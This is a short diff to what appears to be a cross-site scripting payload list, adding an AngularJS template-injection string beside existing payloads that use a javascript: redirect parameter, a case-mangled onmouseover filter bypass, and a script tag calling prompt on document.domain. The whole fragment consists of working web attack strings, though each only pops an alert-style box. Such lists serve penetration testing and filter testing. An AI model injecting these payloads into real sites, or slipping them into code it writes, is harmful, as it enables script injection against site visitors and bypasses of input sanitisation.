@@ -130,3 +130,4 @@ login?redirectUrl=javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520docume
 %3E%3CD3V%0DonMOUseovEr%09=%09["BadrHere"].find(confirm)%0Dx%3Ev3dm0s
 "*alert("Hacked")*"
 <script>prompt(document.domain);</script>
+{{0[a='constructor'][a]('alert(1)')()}}
